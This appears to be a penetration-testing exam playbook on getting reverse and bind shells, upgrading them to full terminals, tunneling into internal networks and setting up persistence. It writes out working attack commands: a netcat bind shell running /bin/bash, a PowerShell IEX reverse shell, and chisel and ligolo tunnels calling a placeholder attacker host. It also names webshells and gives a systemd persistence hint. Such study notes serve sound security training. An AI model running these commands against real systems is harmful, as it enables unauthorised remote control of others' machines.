name: Argha Dey Reverse Shells & Stabilization Playbook
description: Comprehensive reverse shell generation, delivery, and stabilization guide compiled from the Pivoting & Tunneling, OS Command Injection, and Linux Privilege Escalation notes.
examHabits: Test reverse shell connectivity with a simple nc listener BEFORE running the payload
Always use rlwrap with nc -lvnp to have proper shell history
Python pty.spawn for interactive shell; Ctrl+Z + stty raw -echo + fg for terminal upgrade
Have socat backup ready — if one-liners fail, use a bind shell via socat
Document local IP and port on your attack machine before shell delivery

decisionPoints.action: PowerShell IEX one-liner reverse shell (see Nishang/Invoke-PowerShellTcp)

decisionPoints.fallback: Use weevely or b374k for more features
Use a reverse HTTP/HTTPS tunnel with chisel or ligolo

decisionPoints.action: Try bind shell: nc -l -p 4444 -e /bin/bash (then connect from attacker)

decisionPoints.condition: Got a basic shell, need interactive terminal
Shell works but terminal is messy
decisionPoints.action: Ctrl+Z → stty raw -echo → fg → export TERM=xterm
decisionPoints.fallback: Use socat for full terminal emulation

decisionPoints.condition: Need to upgrade a dumb shell to full TTY
decisionPoints.fallback: Upload a precompiled binary or use awk/sed for TTY allocation

decisionPoints.condition: Need to reach internal network from compromised host
decisionPoints.action: Reverse SOCKS: ./chisel client <attacker>:8000 R:socks — then proxychains scan internal
decisionPoints.fallback: ligolo: ligolo -relay <attacker>:5100 — then run internal nmap through the tunnel

decisionPoints.action: ssh -D 1080 <user>@<pivot> (dynamic port forward) — then proxychains4 curl internal
Upload chisel/ligolo binary to target — run reverse proxy
decisionPoints.fallback: Use reGeorg or tunna for HTTP-based tunneling through the webshell
Create systemd service in /etc/systemd/system/ or user systemd in ~/.config/systemd/
